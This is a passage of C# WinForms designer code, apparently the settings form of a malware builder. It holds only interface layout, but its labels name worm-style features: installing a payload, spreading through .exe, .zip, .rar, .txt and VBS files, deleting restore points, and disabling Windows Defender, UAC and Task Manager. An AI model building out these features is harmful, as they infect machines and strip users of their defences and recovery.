		D7.TabIndex = 42;
		D7.Text = "Public";
		D7.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		D7.UncheckedState.BorderThickness = 2;
		D7.UncheckedState.FillColor = Color.Transparent;
		D7.UncheckedState.InnerColor = Color.Transparent;
		Create_vbs.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Create_vbs.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Create_vbs.CheckedState.InnerBorderColor = Color.White;
		Create_vbs.CheckedState.InnerColor = Color.White;
		Create_vbs.CheckedState.Parent = Create_vbs;
		Create_vbs.Enabled = false;
		Create_vbs.Location = new Point(344, 90);
		Create_vbs.Name = "Create_vbs";
		Create_vbs.ShadowDecoration.Parent = Create_vbs;
		Create_vbs.Size = new Size(35, 20);
		Create_vbs.TabIndex = 163;
		Create_vbs.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Create_vbs.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Create_vbs.UncheckedState.InnerBorderColor = Color.White;
		Create_vbs.UncheckedState.InnerColor = Color.White;
		Create_vbs.UncheckedState.Parent = Create_vbs;
		Label43.AutoSize = true;
		Label43.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label43.ForeColor = Color.White;
		Label43.Location = new Point(104, 15);
		Label43.Name = "Label43";
		Label43.Size = new Size(57, 14);
		Label43.TabIndex = 87;
		Label43.Text = "Installing";
		Label58.AutoSize = true;
		Label58.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label58.ForeColor = Color.White;
		Label58.Location = new Point(385, 91);
		Label58.Name = "Label58";
		Label58.Size = new Size(71, 14);
		Label58.TabIndex = 164;
		Label58.Text = "VBS Spread";
		D3.AutoSize = true;
		D3.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		D3.CheckedState.BorderThickness = 0;
		D3.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		D3.CheckedState.InnerColor = Color.White;
		D3.CheckedState.InnerOffset = -4;
		D3.Cursor = Cursors.Hand;
		D3.Enabled = false;
		D3.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		D3.ForeColor = Color.White;
		D3.Location = new Point(12, 202);
		D3.Name = "D3";
		D3.Size = new Size(85, 19);
		D3.TabIndex = 40;
		D3.Text = "User Profile";
		D3.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		D3.UncheckedState.BorderThickness = 2;
		D3.UncheckedState.FillColor = Color.Transparent;
		D3.UncheckedState.InnerColor = Color.Transparent;
		PictureBox54.Image = (Image)componentResourceManager.GetObject("PictureBox54.Image");
		PictureBox54.Location = new Point(529, 274);
		PictureBox54.Name = "PictureBox54";
		PictureBox54.Size = new Size(29, 23);
		PictureBox54.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox54.TabIndex = 162;
		PictureBox54.TabStop = false;
		Install_Payload.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Install_Payload.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Install_Payload.CheckedState.InnerBorderColor = Color.White;
		Install_Payload.CheckedState.InnerColor = Color.White;
		Install_Payload.CheckedState.Parent = Install_Payload;
		Install_Payload.Location = new Point(63, 14);
		Install_Payload.Name = "Install_Payload";
		Install_Payload.ShadowDecoration.Parent = Install_Payload;
		Install_Payload.Size = new Size(35, 20);
		Install_Payload.TabIndex = 86;
		Install_Payload.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Install_Payload.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Install_Payload.UncheckedState.InnerBorderColor = Color.White;
		Install_Payload.UncheckedState.InnerColor = Color.White;
		Install_Payload.UncheckedState.Parent = Install_Payload;
		PictureBox55.Image = (Image)componentResourceManager.GetObject("PictureBox55.Image");
		PictureBox55.Location = new Point(529, 238);
		PictureBox55.Name = "PictureBox55";
		PictureBox55.Size = new Size(29, 23);
		PictureBox55.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox55.TabIndex = 161;
		PictureBox55.TabStop = false;
		D5.AutoSize = true;
		D5.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		D5.CheckedState.BorderThickness = 0;
		D5.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		D5.CheckedState.InnerColor = Color.White;
		D5.CheckedState.InnerOffset = -4;
		D5.Cursor = Cursors.Hand;
		D5.Enabled = false;
		D5.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		D5.ForeColor = Color.White;
		D5.Location = new Point(189, 145);
		D5.Name = "D5";
		D5.Size = new Size(75, 19);
		D5.TabIndex = 57;
		D5.Text = "Windows";
		D5.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		D5.UncheckedState.BorderThickness = 2;
		D5.UncheckedState.FillColor = Color.Transparent;
		D5.UncheckedState.InnerColor = Color.Transparent;
		PictureBox53.Image = (Image)componentResourceManager.GetObject("PictureBox53.Image");
		PictureBox53.Location = new Point(529, 201);
		PictureBox53.Name = "PictureBox53";
		PictureBox53.Size = new Size(29, 23);
		PictureBox53.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox53.TabIndex = 160;
		PictureBox53.TabStop = false;
		D8.AutoSize = true;
		D8.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		D8.CheckedState.BorderThickness = 0;
		D8.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		D8.CheckedState.InnerColor = Color.White;
		D8.CheckedState.InnerOffset = -4;
		D8.Cursor = Cursors.Hand;
		D8.Enabled = false;
		D8.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		D8.ForeColor = Color.White;
		D8.Location = new Point(189, 230);
		D8.Name = "D8";
		D8.Size = new Size(55, 19);
		D8.TabIndex = 75;
		D8.Text = "Temp";
		D8.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		D8.UncheckedState.BorderThickness = 2;
		D8.UncheckedState.FillColor = Color.Transparent;
		D8.UncheckedState.InnerColor = Color.Transparent;
		PictureBox52.Image = (Image)componentResourceManager.GetObject("PictureBox52.Image");
		PictureBox52.Location = new Point(529, 162);
		PictureBox52.Name = "PictureBox52";
		PictureBox52.Size = new Size(29, 23);
		PictureBox52.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox52.TabIndex = 159;
		PictureBox52.TabStop = false;
		Name_Payload.Animated = true;
		Name_Payload.AutoRoundedCorners = true;
		Name_Payload.BackColor = Color.FromArgb(37, 42, 64);
		Name_Payload.BorderColor = Color.FromArgb(0, 126, 249);
		Name_Payload.BorderRadius = 13;
		Name_Payload.BorderStyle = DashStyle.Custom;
		Name_Payload.Cursor = Cursors.IBeam;
		Name_Payload.DefaultText = "";
		Name_Payload.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Name_Payload.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Name_Payload.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Name_Payload.DisabledState.Parent = Name_Payload;
		Name_Payload.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Name_Payload.Enabled = false;
		Name_Payload.FillColor = Color.FromArgb(24, 30, 54);
		Name_Payload.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Name_Payload.FocusedState.Parent = Name_Payload;
		Name_Payload.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Name_Payload.ForeColor = Color.White;
		Name_Payload.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Name_Payload.HoverState.Parent = Name_Payload;
		Name_Payload.IconLeft = (Image)componentResourceManager.GetObject("Name_Payload.IconLeft");
		Name_Payload.Location = new Point(12, 99);
		Name_Payload.Margin = new Padding(3, 2, 3, 2);
		Name_Payload.Name = "Name_Payload";
		Name_Payload.PasswordChar = '\0';
		Name_Payload.PlaceholderForeColor = Color.Gray;
		Name_Payload.PlaceholderText = "Payload Name";
		Name_Payload.SelectedText = "";
		Name_Payload.ShadowDecoration.Parent = Name_Payload;
		Name_Payload.Size = new Size(258, 29);
		Name_Payload.Style = TextBoxStyle.Material;
		Name_Payload.TabIndex = 32;
		Name_Payload.TextAlign = HorizontalAlignment.Center;
		PictureBox42.Image = (Image)componentResourceManager.GetObject("PictureBox42.Image");
		PictureBox42.Location = new Point(288, 198);
		PictureBox42.Name = "PictureBox42";
		PictureBox42.Size = new Size(48, 30);
		PictureBox42.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox42.TabIndex = 152;
		PictureBox42.TabStop = false;
		Name_Folder.Animated = true;
		Name_Folder.AutoRoundedCorners = true;
		Name_Folder.BackColor = Color.FromArgb(24, 30, 54);
		Name_Folder.BorderColor = Color.FromArgb(0, 126, 249);
		Name_Folder.BorderRadius = 13;
		Name_Folder.BorderStyle = DashStyle.Custom;
		Name_Folder.Cursor = Cursors.IBeam;
		Name_Folder.DefaultText = "";
		Name_Folder.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Name_Folder.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Name_Folder.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Name_Folder.DisabledState.Parent = Name_Folder;
		Name_Folder.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Name_Folder.Enabled = false;
		Name_Folder.FillColor = Color.FromArgb(24, 30, 54);
		Name_Folder.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Name_Folder.FocusedState.Parent = Name_Folder;
		Name_Folder.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Name_Folder.ForeColor = Color.White;
		Name_Folder.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Name_Folder.HoverState.Parent = Name_Folder;
		Name_Folder.IconLeft = (Image)componentResourceManager.GetObject("Name_Folder.IconLeft");
		Name_Folder.Location = new Point(12, 53);
		Name_Folder.Margin = new Padding(3, 2, 3, 2);
		Name_Folder.Name = "Name_Folder";
		Name_Folder.PasswordChar = '\0';
		Name_Folder.PlaceholderForeColor = Color.Gray;
		Name_Folder.PlaceholderText = "Folder Name";
		Name_Folder.SelectedText = "";
		Name_Folder.ShadowDecoration.Parent = Name_Folder;
		Name_Folder.Size = new Size(258, 29);
		Name_Folder.Style = TextBoxStyle.Material;
		Name_Folder.TabIndex = 43;
		Name_Folder.TextAlign = HorizontalAlignment.Center;
		Stxt.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Stxt.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Stxt.CheckedState.InnerBorderColor = Color.White;
		Stxt.CheckedState.InnerColor = Color.White;
		Stxt.CheckedState.Parent = Stxt;
		Stxt.Location = new Point(344, 204);
		Stxt.Name = "Stxt";
		Stxt.ShadowDecoration.Parent = Stxt;
		Stxt.Size = new Size(35, 20);
		Stxt.TabIndex = 150;
		Stxt.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Stxt.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Stxt.UncheckedState.InnerBorderColor = Color.White;
		Stxt.UncheckedState.InnerColor = Color.White;
		Stxt.UncheckedState.Parent = Stxt;
		Szip.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Szip.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Szip.CheckedState.InnerBorderColor = Color.White;
		Szip.CheckedState.InnerColor = Color.White;
		Szip.CheckedState.Parent = Szip;
		Szip.Location = new Point(344, 280);
		Szip.Name = "Szip";
		Szip.ShadowDecoration.Parent = Szip;
		Szip.Size = new Size(35, 20);
		Szip.TabIndex = 135;
		Szip.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Szip.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Szip.UncheckedState.InnerBorderColor = Color.White;
		Szip.UncheckedState.InnerColor = Color.White;
		Szip.UncheckedState.Parent = Szip;
		Label61.AutoSize = true;
		Label61.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label61.ForeColor = Color.White;
		Label61.Location = new Point(385, 205);
		Label61.Name = "Label61";
		Label61.Size = new Size(135, 14);
		Label61.TabIndex = 151;
		Label61.Text = "Spreadng in * (.txt) files";
		Label37.AutoSize = true;
		Label37.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label37.ForeColor = Color.White;
		Label37.Location = new Point(385, 281);
		Label37.Name = "Label37";
		Label37.Size = new Size(137, 14);
		Label37.TabIndex = 136;
		Label37.Text = "Spreadng in * (.zip) files";
		PictureBox39.Image = (Image)componentResourceManager.GetObject("PictureBox39.Image");
		PictureBox39.Location = new Point(288, 159);
		PictureBox39.Name = "PictureBox39";
		PictureBox39.Size = new Size(48, 30);
		PictureBox39.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox39.TabIndex = 143;
		PictureBox39.TabStop = false;
		PictureBox36.Image = (Image)componentResourceManager.GetObject("PictureBox36.Image");
		PictureBox36.Location = new Point(288, 274);
		PictureBox36.Name = "PictureBox36";
		PictureBox36.Size = new Size(48, 30);
		PictureBox36.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox36.TabIndex = 137;
		PictureBox36.TabStop = false;
		Label53.AutoSize = true;
		Label53.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label53.ForeColor = Color.White;
		Label53.Location = new Point(385, 166);
		Label53.Name = "Label53";
		Label53.Size = new Size(141, 14);
		Label53.TabIndex = 142;
		Label53.Text = "Spreadng in * (.exe) files";
		Label15.AutoSize = true;
		Label15.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label15.ForeColor = Color.White;
		Label15.Location = new Point(385, 242);
		Label15.Name = "Label15";
		Label15.Size = new Size(137, 14);
		Label15.TabIndex = 139;
		Label15.Text = "Spreadng in * (.rar) files";
		Sexe.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Sexe.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Sexe.CheckedState.InnerBorderColor = Color.White;
		Sexe.CheckedState.InnerColor = Color.White;
		Sexe.CheckedState.Parent = Sexe;
		Sexe.Location = new Point(344, 165);
		Sexe.Name = "Sexe";
		Sexe.ShadowDecoration.Parent = Sexe;
		Sexe.Size = new Size(35, 20);
		Sexe.TabIndex = 141;
		Sexe.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Sexe.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Sexe.UncheckedState.InnerBorderColor = Color.White;
		Sexe.UncheckedState.InnerColor = Color.White;
		Sexe.UncheckedState.Parent = Sexe;
		Srar.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Srar.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Srar.CheckedState.InnerBorderColor = Color.White;
		Srar.CheckedState.InnerColor = Color.White;
		Srar.CheckedState.Parent = Srar;
		Srar.Location = new Point(344, 241);
		Srar.Name = "Srar";
		Srar.ShadowDecoration.Parent = Srar;
		Srar.Size = new Size(35, 20);
		Srar.TabIndex = 138;
		Srar.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Srar.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Srar.UncheckedState.InnerBorderColor = Color.White;
		Srar.UncheckedState.InnerColor = Color.White;
		Srar.UncheckedState.Parent = Srar;
		PictureBox29.Image = (Image)componentResourceManager.GetObject("PictureBox29.Image");
		PictureBox29.Location = new Point(288, 235);
		PictureBox29.Name = "PictureBox29";
		PictureBox29.Size = new Size(48, 30);
		PictureBox29.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox29.TabIndex = 140;
		PictureBox29.TabStop = false;
		Security1.BackColor = Color.FromArgb(46, 51, 73);
		Security1.Controls.Add(Panel23);
		Security1.Location = new Point(4, 22);
		Security1.Name = "Security1";
		Security1.Size = new Size(894, 398);
		Security1.TabIndex = 4;
		Security1.Text = "Security";
		Panel23.BackColor = Color.FromArgb(46, 51, 73);
		Panel23.Controls.Add(Guna2GradientPanel10);
		Panel23.Controls.Add(Tab_Process);
		Panel23.Dock = DockStyle.Fill;
		Panel23.ForeColor = Color.FromArgb(37, 42, 64);
		Panel23.Location = new Point(0, 0);
		Panel23.Name = "Panel23";
		Panel23.Size = new Size(894, 398);
		Panel23.TabIndex = 67;
		Guna2GradientPanel10.BackColor = Color.FromArgb(24, 30, 54);
		Guna2GradientPanel10.Controls.Add(PictureBox69);
		Guna2GradientPanel10.Controls.Add(PictureBox17);
		Guna2GradientPanel10.Controls.Add(Kill_Process);
		Guna2GradientPanel10.Controls.Add(Label51);
		Guna2GradientPanel10.Controls.Add(PictureBox68);
		Guna2GradientPanel10.Controls.Add(Label5);
		Guna2GradientPanel10.Controls.Add(Disable_Control);
		Guna2GradientPanel10.Controls.Add(Delete_SRS);
		Guna2GradientPanel10.Controls.Add(Label75);
		Guna2GradientPanel10.Controls.Add(PictureBox62);
		Guna2GradientPanel10.Controls.Add(PictureBox63);
		Guna2GradientPanel10.Controls.Add(Label76);
		Guna2GradientPanel10.Controls.Add(Label50);
		Guna2GradientPanel10.Controls.Add(PictureBox64);
		Guna2GradientPanel10.Controls.Add(Disable_Task);
		Guna2GradientPanel10.Controls.Add(Disable_UAC);
		Guna2GradientPanel10.Controls.Add(WD_exception);
		Guna2GradientPanel10.Controls.Add(Label77);
		Guna2GradientPanel10.Controls.Add(PictureBox66);
		Guna2GradientPanel10.Controls.Add(Label79);
		Guna2GradientPanel10.Controls.Add(Disable_WD);
		Guna2GradientPanel10.Controls.Add(PictureBox67);
		Guna2GradientPanel10.Controls.Add(Disable_Hide);
		Guna2GradientPanel10.Controls.Add(Label80);
		Guna2GradientPanel10.Location = new Point(37, 36);
		Guna2GradientPanel10.Name = "Guna2GradientPanel10";
		Guna2GradientPanel10.ShadowDecoration.Parent = Guna2GradientPanel10;
		Guna2GradientPanel10.Size = new Size(404, 326);
		Guna2GradientPanel10.TabIndex = 107;
		PictureBox69.Image = (Image)componentResourceManager.GetObject("PictureBox69.Image");
		PictureBox69.Location = new Point(15, 89);
		PictureBox69.Name = "PictureBox69";
		PictureBox69.Size = new Size(48, 30);
		PictureBox69.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox69.TabIndex = 156;
		PictureBox69.TabStop = false;
		PictureBox17.Image = (Image)componentResourceManager.GetObject("PictureBox17.Image");
		PictureBox17.Location = new Point(15, 289);
		PictureBox17.Name = "PictureBox17";
		PictureBox17.Size = new Size(48, 30);
		PictureBox17.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox17.TabIndex = 155;
		PictureBox17.TabStop = false;
		Kill_Process.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Kill_Process.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Kill_Process.CheckedState.InnerBorderColor = Color.White;
		Kill_Process.CheckedState.InnerColor = Color.White;
		Kill_Process.CheckedState.Parent = Kill_Process;
		Kill_Process.Location = new Point(71, 295);
		Kill_Process.Name = "Kill_Process";
		Kill_Process.ShadowDecoration.Parent = Kill_Process;
		Kill_Process.Size = new Size(35, 20);
		Kill_Process.TabIndex = 153;
		Kill_Process.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Kill_Process.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Kill_Process.UncheckedState.InnerBorderColor = Color.White;
		Kill_Process.UncheckedState.InnerColor = Color.White;
		Kill_Process.UncheckedState.Parent = Kill_Process;
		Label51.AutoSize = true;
		Label51.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label51.ForeColor = Color.White;
		Label51.Location = new Point(112, 295);
		Label51.Name = "Label51";
		Label51.Size = new Size(112, 14);
		Label51.TabIndex = 154;
		Label51.Text = "Terminate Process";
		PictureBox68.Image = (Image)componentResourceManager.GetObject("PictureBox68.Image");
		PictureBox68.Location = new Point(15, 169);
		PictureBox68.Name = "PictureBox68";
		PictureBox68.Size = new Size(48, 30);
		PictureBox68.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox68.TabIndex = 152;
		PictureBox68.TabStop = false;
		Label5.AutoSize = true;
		Label5.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label5.ForeColor = Color.White;
		Label5.Location = new Point(112, 219);
		Label5.Name = "Label5";
		Label5.Size = new Size(190, 14);
		Label5.TabIndex = 151;
		Label5.Text = "Disable Show Hidden Files Option";
		Disable_Control.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Disable_Control.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Disable_Control.CheckedState.InnerBorderColor = Color.White;
		Disable_Control.CheckedState.InnerColor = Color.White;
		Disable_Control.CheckedState.Parent = Disable_Control;
		Disable_Control.Location = new Point(72, 175);
		Disable_Control.Name = "Disable_Control";
		Disable_Control.ShadowDecoration.Parent = Disable_Control;
		Disable_Control.Size = new Size(35, 20);
		Disable_Control.TabIndex = 150;
		Disable_Control.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Disable_Control.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Disable_Control.UncheckedState.InnerBorderColor = Color.White;
		Disable_Control.UncheckedState.InnerColor = Color.White;
		Disable_Control.UncheckedState.Parent = Disable_Control;
		Delete_SRS.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Delete_SRS.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Delete_SRS.CheckedState.InnerBorderColor = Color.White;
		Delete_SRS.CheckedState.InnerColor = Color.White;
		Delete_SRS.CheckedState.Parent = Delete_SRS;
		Delete_SRS.Location = new Point(72, 94);
		Delete_SRS.Name = "Delete_SRS";
		Delete_SRS.ShadowDecoration.Parent = Delete_SRS;
		Delete_SRS.Size = new Size(35, 20);
		Delete_SRS.TabIndex = 147;
		Delete_SRS.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Delete_SRS.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Delete_SRS.UncheckedState.InnerBorderColor = Color.White;
		Delete_SRS.UncheckedState.InnerColor = Color.White;
		Delete_SRS.UncheckedState.Parent = Delete_SRS;
		Label75.AutoSize = true;
		Label75.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label75.ForeColor = Color.White;
		Label75.Location = new Point(113, 94);
		Label75.Name = "Label75";
		Label75.Size = new Size(172, 14);
		Label75.TabIndex = 148;
		Label75.Text = "Delete System Restore Points";
		PictureBox62.Image = (Image)componentResourceManager.GetObject("PictureBox62.Image");
		PictureBox62.Location = new Point(15, 249);
		PictureBox62.Name = "PictureBox62";
		PictureBox62.Size = new Size(48, 30);
		PictureBox62.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox62.TabIndex = 144;
		PictureBox62.TabStop = false;
		PictureBox63.Image = (Image)componentResourceManager.GetObject("PictureBox63.Image");
		PictureBox63.Location = new Point(15, 129);
		PictureBox63.Name = "PictureBox63";
		PictureBox63.Size = new Size(48, 30);
		PictureBox63.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox63.TabIndex = 137;
		PictureBox63.TabStop = false;
		Label76.AutoSize = true;
		Label76.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label76.ForeColor = Color.White;
		Label76.Location = new Point(115, 137);
		Label76.Name = "Label76";
		Label76.Size = new Size(127, 14);
		Label76.TabIndex = 136;
		Label76.Text = "Disable Task Manager";
		Label50.AutoSize = true;
		Label50.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label50.ForeColor = Color.White;
		Label50.Location = new Point(112, 257);
		Label50.Name = "Label50";
		Label50.Size = new Size(73, 14);
		Label50.TabIndex = 101;
		Label50.Text = "Disable UAC";
		PictureBox64.Image = (Image)componentResourceManager.GetObject("PictureBox64.Image");
		PictureBox64.Location = new Point(15, 7);
		PictureBox64.Name = "PictureBox64";
		PictureBox64.Size = new Size(48, 30);
		PictureBox64.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox64.TabIndex = 134;
		PictureBox64.TabStop = false;
		Disable_Task.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Disable_Task.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Disable_Task.CheckedState.InnerBorderColor = Color.White;
		Disable_Task.CheckedState.InnerColor = Color.White;
		Disable_Task.CheckedState.Parent = Disable_Task;
		Disable_Task.Location = new Point(72, 135);
		Disable_Task.Name = "Disable_Task";
		Disable_Task.ShadowDecoration.Parent = Disable_Task;
		Disable_Task.Size = new Size(35, 20);
		Disable_Task.TabIndex = 135;
		Disable_Task.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Disable_Task.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Disable_Task.UncheckedState.InnerBorderColor = Color.White;
		Disable_Task.UncheckedState.InnerColor = Color.White;
		Disable_Task.UncheckedState.Parent = Disable_Task;
		Disable_UAC.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Disable_UAC.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Disable_UAC.CheckedState.InnerBorderColor = Color.White;
		Disable_UAC.CheckedState.InnerColor = Color.White;
		Disable_UAC.CheckedState.Parent = Disable_UAC;
		Disable_UAC.Location = new Point(71, 256);
		Disable_UAC.Name = "Disable_UAC";
		Disable_UAC.ShadowDecoration.Parent = Disable_UAC;
		Disable_UAC.Size = new Size(35, 20);
		Disable_UAC.TabIndex = 100;
		Disable_UAC.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Disable_UAC.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Disable_UAC.UncheckedState.InnerBorderColor = Color.White;
		Disable_UAC.UncheckedState.InnerColor = Color.White;
		Disable_UAC.UncheckedState.Parent = Disable_UAC;
		WD_exception.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		WD_exception.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		WD_exception.CheckedState.InnerBorderColor = Color.White;
		WD_exception.CheckedState.InnerColor = Color.White;
		WD_exception.CheckedState.Parent = WD_exception;
		WD_exception.Location = new Point(71, 13);
		WD_exception.Name = "WD_exception";
		WD_exception.ShadowDecoration.Parent = WD_exception;
		WD_exception.Size = new Size(35, 20);
		WD_exception.TabIndex = 132;
		WD_exception.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		WD_exception.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		WD_exception.UncheckedState.InnerBorderColor = Color.White;
		WD_exception.UncheckedState.InnerColor = Color.White;
		WD_exception.UncheckedState.Parent = WD_exception;
		Label77.AutoSize = true;
		Label77.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label77.ForeColor = Color.White;
		Label77.Location = new Point(112, 18);
		Label77.Name = "Label77";
		Label77.Size = new Size(210, 14);
		Label77.TabIndex = 133;
		Label77.Text = "Add an exception Windows Defender";
		PictureBox66.Image = (Image)componentResourceManager.GetObject("PictureBox66.Image");
		PictureBox66.Location = new Point(15, 47);
		PictureBox66.Name = "PictureBox66";
		PictureBox66.Size = new Size(48, 30);
		PictureBox66.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox66.TabIndex = 119;
		PictureBox66.TabStop = false;
		Label79.AutoSize = true;
		Label79.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label79.ForeColor = Color.White;
		Label79.Location = new Point(112, 54);
		Label79.Name = "Label79";
		Label79.Size = new Size(203, 14);
		Label79.TabIndex = 118;
		Label79.Text = "Disable Windows Defender Security";
		Disable_WD.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Disable_WD.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Disable_WD.CheckedState.InnerBorderColor = Color.White;
		Disable_WD.CheckedState.InnerColor = Color.White;
		Disable_WD.CheckedState.Parent = Disable_WD;
		Disable_WD.Location = new Point(71, 53);
		Disable_WD.Name = "Disable_WD";
		Disable_WD.ShadowDecoration.Parent = Disable_WD;
		Disable_WD.Size = new Size(35, 20);
		Disable_WD.TabIndex = 117;
		Disable_WD.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Disable_WD.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Disable_WD.UncheckedState.InnerBorderColor = Color.White;
		Disable_WD.UncheckedState.InnerColor = Color.White;
		Disable_WD.UncheckedState.Parent = Disable_WD;
		PictureBox67.Image = (Image)componentResourceManager.GetObject("PictureBox67.Image");
		PictureBox67.Location = new Point(16, 210);
		PictureBox67.Name = "PictureBox67";
		PictureBox67.Size = new Size(48, 30);
		PictureBox67.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox67.TabIndex = 113;
		PictureBox67.TabStop = false;
		Disable_Hide.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Disable_Hide.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Disable_Hide.CheckedState.InnerBorderColor = Color.White;
		Disable_Hide.CheckedState.InnerColor = Color.White;
		Disable_Hide.CheckedState.Parent = Disable_Hide;
		Disable_Hide.Location = new Point(72, 216);
		Disable_Hide.Name = "Disable_Hide";
		Disable_Hide.ShadowDecoration.Parent = Disable_Hide;
		Disable_Hide.Size = new Size(35, 20);
		Disable_Hide.TabIndex = 111;
		Disable_Hide.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Disable_Hide.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Disable_Hide.UncheckedState.InnerBorderColor = Color.White;
		Disable_Hide.UncheckedState.InnerColor = Color.White;
		Disable_Hide.UncheckedState.Parent = Disable_Hide;
		Label80.AutoSize = true;
		Label80.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label80.ForeColor = Color.White;
		Label80.Location = new Point(114, 178);
		Label80.Name = "Label80";
		Label80.Size = new Size(124, 14);
		Label80.TabIndex = 112;
		Label80.Text = "Disable Control Panel";
		Tab_Process.BackColor = Color.FromArgb(24, 30, 54);
